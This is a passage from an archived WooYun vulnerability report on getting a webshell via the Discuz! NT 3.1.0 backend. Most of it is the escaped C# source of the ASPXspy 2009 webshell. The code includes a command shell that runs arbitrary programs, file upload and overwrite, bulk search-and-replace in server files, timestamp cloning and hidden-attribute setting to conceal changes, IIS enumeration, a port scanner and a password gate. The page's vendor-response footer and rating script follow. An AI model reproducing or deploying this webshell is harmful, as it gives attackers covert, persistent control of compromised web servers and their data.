s+=@&quot;function Bin_PostBack(eventTarget,eventArgument)&quot;;<br />
<br />
s+=@&quot;{&quot;;<br />
<br />
s+=@&quot;var theform=document.forms[0];&quot;;<br />
<br />
s+=@&quot;theform.__EVENTTARGET.value=eventTarget;&quot;;<br />
<br />
s+=@&quot;theform.__FILE.value=eventArgument;&quot;;<br />
<br />
s+=@&quot;theform.submit();&quot;;<br />
<br />
s+=@&quot;} &quot;;<br />
<br />
s+=@&quot;&lt;/scr&quot;+&quot;ipt&gt;&quot;;<br />
<br />
page.RegisterStartupScript(&quot;&quot;,s);<br />
<br />
}<br />
<br />
protected void PPtK(object sender,EventArgs e)<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
yhv.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;File Search &gt;&gt;&quot;;<br />
<br />
NaLJ.Value=Request.PhysicalApplicationPath;<br />
<br />
oJiym.Visible=false;<br />
<br />
}<br />
<br />
protected void NBy(object sender,EventArgs e)<br />
<br />
{<br />
<br />
DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);<br />
<br />
if(!GQMM.Exists)<br />
<br />
{<br />
<br />
xseuB(&quot;Path invalid ! &quot;);<br />
<br />
return;<br />
<br />
}<br />
<br />
oog(GQMM);<br />
<br />
xseuB(&quot;Search completed ! &quot;);<br />
<br />
}<br />
<br />
public void oog(DirectoryInfo dir)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
oJiym.Visible=true;<br />
<br />
foreach(FileInfo Bin_Files in dir.GetFiles())<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
if(Bin_Files.FullName==Request.PhysicalPath)<br />
<br />
{<br />
<br />
continue;<br />
<br />
}<br />
<br />
if(!Regex.IsMatch(Bin_Files.Extension.Replace(&quot;.&quot;,&quot;&quot;),&quot;^(&quot;+UDLvA.Value+&quot;)$&quot;,RegexOptions.IgnoreCase))<br />
<br />
{<br />
<br />
continue;<br />
<br />
}<br />
<br />
if(Ven.SelectedItem.Value==&quot;name&quot;)<br />
<br />
{<br />
<br />
if(rAQ.Checked)<br />
<br />
{<br />
<br />
if(Regex.IsMatch(Bin_Files.Name,iaMKl.Value,RegexOptions.IgnoreCase))<br />
<br />
{<br />
<br />
FJvQ(Bin_Files);<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
if(Bin_Files.Name.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)<br />
<br />
{<br />
<br />
Response.Write(Bin_Files.FullName);<br />
<br />
FJvQ(Bin_Files);<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);<br />
<br />
string ava=sr.ReadToEnd();<br />
<br />
sr.Close();<br />
<br />
if(rAQ.Checked)<br />
<br />
{<br />
<br />
if(Regex.IsMatch(ava,iaMKl.Value,RegexOptions.IgnoreCase))<br />
<br />
{<br />
<br />
FJvQ(Bin_Files);<br />
<br />
if(YZw.Checked)<br />
<br />
{<br />
<br />
ava=Regex.Replace(ava,iaMKl.Value,qPe.Value,RegexOptions.IgnoreCase);<br />
<br />
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);<br />
<br />
sw.Write(ava);<br />
<br />
sw.Close();<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
if(ava.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)<br />
<br />
{<br />
<br />
FJvQ(Bin_Files);<br />
<br />
if(YZw.Checked)<br />
<br />
{<br />
<br />
ava=Strings.Replace(ava,iaMKl.Value,qPe.Value,1,-1,CompareMethod.Text);<br />
<br />
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);<br />
<br />
sw.Write(ava);<br />
<br />
sw.Close();<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception ex)<br />
<br />
{<br />
<br />
xseuB(ex.Message);<br />
<br />
continue;<br />
<br />
}<br />
<br />
}<br />
<br />
foreach(DirectoryInfo subdir in dir.GetDirectories())<br />
<br />
{<br />
<br />
oog(subdir);<br />
<br />
}<br />
<br />
}<br />
<br />
catch(Exception ex)<br />
<br />
{<br />
<br />
xseuB(ex.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
public void FJvQ(FileInfo objfile)<br />
<br />
{<br />
<br />
TableRow tr=new TableRow();<br />
<br />
TableCell tc=new TableCell();<br />
<br />
string bg=OKM();<br />
<br />
tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#039;focus&#039;;&quot;;<br />
<br />
tr.CssClass=bg;<br />
<br />
tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#039;&quot;+bg+&quot;&#039;;&quot;;<br />
<br />
tc.Text=&quot;&lt;a href=\&quot;javascript:Bin_PostBack(&#039;Bin_Listdir&#039;,&#039;&quot;+MVVJ(objfile.DirectoryName)+&quot;&#039;)\&quot;&gt;&quot;+objfile.FullName+&quot;&lt;/a&gt;&quot;;<br />
<br />
tr.Cells.Add(tc);<br />
<br />
tc=new TableCell();<br />
<br />
tc.Text=objfile.LastWriteTime.ToString();<br />
<br />
tr.Cells.Add(tc);<br />
<br />
tc=new TableCell();<br />
<br />
tc.Text=mTG(objfile.Length);<br />
<br />
tr.Cells.Add(tc);<br />
<br />
oJiym.Rows.Add(tr);<br />
<br />
}<br />
<br />
public void xseuB(string instr)<br />
<br />
{<br />
<br />
jDKt.Visible=true;<br />
<br />
jDKt.InnerText=instr;<br />
<br />
}<br />
<br />
protected void xVm(object sender,EventArgs e)<br />
<br />
{<br />
<br />
string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,&quot;MD5&quot;).ToLower();<br />
<br />
if(Jfm==Password)<br />
<br />
{<br />
<br />
Response.Cookies.Add(new HttpCookie(vbhLn,Password));<br />
<br />
ljtzC.Visible=false;<br />
<br />
PBZw();<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
tZSx();<br />
<br />
}<br />
<br />
}<br />
<br />
protected void Ybg(object sender,EventArgs e)<br />
<br />
{<br />
<br />
krIR(Server.MapPath(&quot;.&quot;));<br />
<br />
}<br />
<br />
protected void KjPi(object sender,EventArgs e)<br />
<br />
{<br />
<br />
Bin_H2_Title.InnerText=&quot;IIS Spy &gt;&gt;&quot;;<br />
<br />
WICxe();<br />
<br />
VNR.Visible=true;<br />
<br />
AdCx();<br />
<br />
}<br />
<br />
protected void DGCoW(object sender,EventArgs e)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
StreamWriter sw;<br />
<br />
if(NdCX.SelectedItem.Text==&quot;UTF-8&quot;)<br />
<br />
{<br />
<br />
sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
sw=new StreamWriter(Sqon.Value,false,Encoding.Default);<br />
<br />
}<br />
<br />
sw.Write(Xgvv.InnerText);<br />
<br />
sw.Close();<br />
<br />
xseuB(&quot;Save file success !&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void lbjLD(object sender,EventArgs e)<br />
<br />
{<br />
<br />
string FlwA=AXSbb.Value;<br />
<br />
FlwA=OElM(FlwA);<br />
<br />
try<br />
<br />
{<br />
<br />
Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));<br />
<br />
xseuB(&quot;File upload success!&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void EXV(object sender,EventArgs e)<br />
<br />
{<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void mcCY(object sender,EventArgs e)<br />
<br />
{<br />
<br />
krIR(Server.MapPath(&quot;.&quot;));<br />
<br />
}<br />
<br />
protected void iVk(object sender,CommandEventArgs e)<br />
<br />
{<br />
<br />
krIR(e.CommandArgument.ToString());<br />
<br />
}<br />
<br />
protected void XXrLw(object sender,EventArgs e)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));<br />
<br />
File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));<br />
<br />
File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));<br />
<br />
xseuB(&quot;File time clone success!&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void tIykC(object sender,EventArgs e)<br />
<br />
{<br />
<br />
string path=pWVL.Value;<br />
<br />
try<br />
<br />
{<br />
<br />
File.SetAttributes(path,FileAttributes.Normal);<br />
<br />
if(ZhWSK.Checked)<br />
<br />
{<br />
<br />
File.SetAttributes(path,FileAttributes.ReadOnly);<br />
<br />
}<br />
<br />
if(SsR.Checked)<br />
<br />
{<br />
<br />
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);<br />
<br />
}<br />
<br />
if(ccB.Checked)<br />
<br />
{<br />
<br />
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);<br />
<br />
}<br />
<br />
if(fbyZ.Checked)<br />
<br />
{<br />
<br />
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);<br />
<br />
}<br />
<br />
File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));<br />
<br />
File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));<br />
<br />
File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));<br />
<br />
xseuB(&quot;File attributes modify success!&quot;);<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void VOxn(object sender,EventArgs e)<br />
<br />
{<br />
<br />
WICxe();<br />
<br />
vIac.Visible=true;<br />
<br />
Bin_H2_Title.InnerText=&quot;Execute Command &gt;&gt;&quot;;<br />
<br />
}<br />
<br />
protected void FbhN(object sender,EventArgs e)<br />
<br />
{<br />
<br />
try<br />
<br />
{<br />
<br />
Process ahAE=new Process();<br />
<br />
ahAE.StartInfo.FileName=kusi.Value;<br />
<br />
ahAE.StartInfo.Arguments=bkcm.Value;<br />
<br />
ahAE.StartInfo.UseShellExecute=false;<br />
<br />
ahAE.StartInfo.RedirectStandardInput=true;<br />
<br />
ahAE.StartInfo.RedirectStandardOutput=true;<br />
<br />
ahAE.StartInfo.RedirectStandardError=true;<br />
<br />
ahAE.Start();<br />
<br />
string Uoc=ahAE.StandardOutput.ReadToEnd();<br />
<br />
Uoc=Uoc.Replace(&quot;&lt;&quot;,&quot;&amp;lt;&quot;);<br />
<br />
Uoc=Uoc.Replace(&quot;&gt;&quot;,&quot;&amp;gt;&quot;);<br />
<br />
Uoc=Uoc.Replace(&quot;\r\n&quot;,&quot;&lt;br&gt;&quot;);<br />
<br />
tnQRF.Visible=true;<br />
<br />
tnQRF.InnerHtml=&quot;&lt;hr width=\&quot;100%\&quot; noshade/&gt;&lt;pre&gt;&quot;+Uoc+&quot;&lt;/pre&gt;&quot;;<br />
<br />
}<br />
<br />
catch(Exception error)<br />
<br />
{<br />
<br />
xseuB(error.Message);<br />
<br />
}<br />
<br />
}<br />
<br />
protected void RAFL(object sender,EventArgs e)<br />
<br />
{<br />
<br />
if(qPdI.Text.Length&gt;0)<br />
<br />
{<br />
<br />
tpRQ(qPdI.Text);<br />
<br />
}<br />
<br />
else<br />
<br />
{<br />
<br />
lFAvw();<br />
<br />
}<br />
<br />
}<br />
<br />
protected void Grxk(object sender,EventArgs e)<br />
<br />
{<br />
<br />
YUw();<br />
<br />
}<br />
<br />
protected void ilC(object sender,EventArgs e)<br />
<br />
{<br />
<br />
tZRH();<br />
<br />
}<br />
<br />
protected void HtB(object sender,EventArgs e)<br />
<br />
{<br />
<br />
pDVM();<br />
<br />
}<br />
<br />
protected void Olm(object sender,EventArgs e)<br />
<br />
{<br />
<br />
iLVUT();<br />
<br />
}<br />
<br />
protected void jXhS(object sender,EventArgs e)<br />
<br />
{<br />
<br />
ADCpk();<br />
<br />
}<br />
<br />
protected void lRfRj(object sender,EventArgs e)<br />
<br />
{<br />
<br />
lDODR();<br />
<br />
}<br />
<br />
protected void xSy(object sender,EventArgs e)<br />
<br />
{<br />
<br />
xFhz();<br />
<br />
}<br />
<br />
protected void dMx(object sender,EventArgs e)<br />
<br />
{<br />
<br />
rAhe();<br />
<br />
}<br />
<br />
protected void zOVO(object sender,EventArgs e)<br />
<br />
{<br />
<br />
if(((DropDownList)sender).ID.ToString()==&quot;WYmo&quot;)<br />
<br />
{<br />
<br />
dQIIF.Visible=false;<br />
<br />
MasR.Text=WYmo.SelectedItem.Value.ToString();<br />
<br />
}<br />
<br />
if(((DropDownList)sender).ID.ToString()==&quot;Pvf&quot;)<br />
<br />
{<br />
<br />
xTZY();<br />
<br />
}<br />
<br />
if(((DropDownList)sender).ID.ToString()==&quot;FGEy&quot;)<br />
<br />
{<br />
<br />
jHIy.InnerText=FGEy.SelectedItem.Value.ToString();<br />
<br />
}<br />
<br />
if(((DropDownList)sender).ID.ToString()==&quot;NdCX&quot;)<br />
<br />
{<br />
<br />
gLKc(Sqon.Value);<br />
<br />
}<br />
<br />
}<br />
<br />
protected void IkkO(object sender,EventArgs e)<br />
<br />
{<br />
<br />
krIR(AXSbb.Value);<br />
<br />
}<br />
<br />
protected void BGY(object sender,EventArgs e)<br />
<br />
{<br />
<br />
vCf();<br />
<br />
}<br />
<br />
protected void cptS(object sender,EventArgs e)<br />
<br />
{<br />
<br />
vNCHZ();<br />
<br />
}<br />
<br />
protected void fDO(object sender,EventArgs e)<br />
<br />
{<br />
<br />
MHLv();<br />
<br />
}<br />
<br />
protected void vJNsE(object sender,EventArgs e)<br />
<br />
{<br />
<br />
vuou();<br />
<br />
xseuB(&quot;Clear All Thread ......&quot;);<br />
<br />
}<br />
<br />
protected void wDZ(object sender,EventArgs e)<br />
<br />
{<br />
<br />
if(iXdh.Value==&quot;&quot; || eEpm.Value.Length&lt;7 || ZHS.Value==&quot;&quot;)return;<br />
<br />
ruQO();<br />
<br />
xseuB(&quot;All Thread Start ......&quot;);<br />
<br />
}<br />
<br />
protected void tYoZ(object sender,EventArgs e)<br />
<br />
{<br />
<br />
}<br />
<br />
protected void ELkQ(object sender,EventArgs e)<br />
<br />
{<br />
<br />
VikG();<br />
<br />
GBYT.Visible=true;<br />
<br />
string res=string.Empty;<br />
<br />
foreach(ScanPort th in IVc)<br />
<br />
{<br />
<br />
res+=th.ip+&quot; : &quot;+th.port+&quot; ................................. &quot;+th.status+&quot;&lt;br&gt;&quot;;<br />
<br />
}<br />
<br />
GBYT.InnerHtml=res;<br />
<br />
}<br />
<br />
protected void ORUgV(object sender,EventArgs e)<br />
<br />
{<br />
<br />
dwgT();<br />
<br />
}<br />
<br />
public void WICxe()<br />
<br />
{<br />
<br />
DCbS.Visible=false;<br />
<br />
CzfO.Visible=false;<br />
<br />
APl.Visible=false;<br />
<br />
vIac.Visible=false;<br />
<br />
kkHN.Visible=false;<br />
<br />
YwLB.Visible=false;<br />
<br />
iDgmL.Visible=false;<br />
<br />
hOWTm.Visible=false;<br />
<br />
vrFA.Visible=false;<br />
<br />
yhv.Visible=false;<br />
<br />
}<br />
<br />
&lt;/script&gt;<br />
<br />
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; &gt;<br />
<br />
&lt;head id=&quot;Head1&quot; runat=&quot;server&quot;&gt;<br />
<br />
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;<br />
<br />
&lt;title&gt;ASPXspy&lt;/title&gt;<br />
<br />
&lt;style type=&quot;text/css&quot;&gt;<br />
<br />
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}<br />
<br />
body,td{font: 12px Arial,Tahoma;line-height: 16px;}<br />
<br />
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}<br />
<br />
.list{font:12px Arial,Tahoma;height:23px;}<br />
<br />
.area{font:12px &#039;Courier New&#039;,Monospace;background:#fff;border: 1px solid #666;padding:2px;}<br />
<br />
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}<br />
<br />
a {color: #00f;text-decoration:underline;}<br />
<br />
a:hover{color: #f00;text-decoration:none;}<br />
<br />
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}<br />
<br />
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}<br />
<br />
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}<br />
<br />
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}<br />
<br />
.head td span{font-weight:normal;}<br />
<br />
form{margin:0;padding:0;}<br />
<br />
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}<br />
<br />
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}<br />
<br />
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}<br />
<br />
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}<br />
<br />
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}<br />
<br />
&lt;/style&gt;<br />
<br />
&lt;script type=&quot;text/javascript&quot;&gt;<br />
<br />
function CheckAll(form){<br />
<br />
for(var i=0;i&lt;form.elements.length;i++){<br />
<br />
var e=form.elements[i];<br />
<br />
if(e.name!=&#039;chkall&#039;)<br />
<br />
e.checked=form.chkall.checked;<br />
<br />
}<br />
<br />
}<br />
<br />
&lt;/script&gt;<br />
<br />
&lt;/head&gt;<br />
<br />
&lt;body style=&quot;margin:0;table-layout:fixed;&quot;&gt;<br />
<br />
&lt;form id=&quot;ASPXSpy&quot; runat=&quot;server&quot;&gt;<br />
<br />
&lt;div id=&quot;ljtzC&quot; runat=&quot;server&quot; style=&quot; margin:15px&quot; enableviewstate=&quot;false&quot; visible=&quot;false&quot; &gt;<br />
<br />
&lt;span style=&quot;font:11px Verdana;&quot;&gt;Password:&lt;/span&gt;<br />
<br />
&lt;asp:TextBox ID=&quot;HRJ&quot; runat=&quot;server&quot; Columns=&quot;20&quot; CssClass=&quot;Bin_Style_Login&quot; &gt;&lt;/asp:TextBox&gt;<br />
<br />
&lt;asp:Button ID=&quot;ZSnXu&quot; runat=&quot;server&quot; Text=&quot;Login&quot; CssClass=&quot;Bin_Style_Login&quot; OnClick=&quot;xVm&quot;/&gt;&lt;p/&gt;<br />
<br />
Copyright &amp;copy; 2009 Bin -- &lt;a href=&quot;http://www.rootkit.net.cn&quot; target=&quot;_blank&quot;&gt;www.rootkit.net.cn&lt;/a&gt;<br />
<br />
&lt;/div&gt;<br />
<br />
&lt;div id=&quot;ZVS&quot; runat=&quot;server&quot;&gt;<br />
<br />
&lt;div id=&quot;Zzj&quot; runat=&quot;server&quot;&gt;<br />
<br />
&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br />
<br />
&lt;tr class=&quot;head&quot;&gt;<br />
<br />
&lt;td &gt;&lt;span style=&quot;float:right;&quot;&gt;&lt;a href=&quot;http://www.rootkit.net.cn&quot; target=&quot;_blank&quot;&gt;ASPXSpy Ver: 2009&lt;/a&gt;&lt;/span&gt;&lt;span id=&quot;Bin_Span_Sname&quot; runat=&quot;server&quot; enableviewstate=&quot;true&quot;&gt;&lt;/span&gt;&lt;/td&gt;<br />
<br />
&lt;/tr&gt;<br />
<br />
&lt;tr class=&quot;alt1&quot;&gt;<br />
<br />
&lt;td&gt;&lt;span style=&quot;float:right;&quot; id=&quot;Bin_Span_FrameVersion&quot; runat=&quot;server&quot;&gt;&lt;/span&gt;<br />
<br />
&lt;asp:LinkButton ID=&quot;UtkN&quot; runat=&quot;server&quot; OnClick=&quot;YKpI&quot; Text=&quot;Logout&quot; &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID=&quot;RsqhW&quot; runat=&quot;server&quot; Text=&quot;File Manager&quot; OnClick=&quot;Ybg&quot;&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID=&quot;xxzE&quot; runat=&quot;server&quot; Text=&quot;CmdShell&quot; OnClick=&quot;VOxn&quot;&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID=&quot;nuc&quot; runat=&quot;server&quot; Text=&quot;IIS Spy&quot; OnClick=&quot;KjPi&quot;&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID=&quot;OREpx&quot; runat=&quot;server&quot; Text=&quot;Process&quot; OnClick=&quot;Grxk&quot;&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID=&quot;jHN&quot; runat=&quot;s </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">无 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/webshell" title="webshell">webshell</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-02055" title="Discuz! NT 3.1.0 后台拿webshell">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：8 </p>
													<p class="detail">确认时间：2011-05-05 10:28</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">谢谢您的提供</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="2055";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
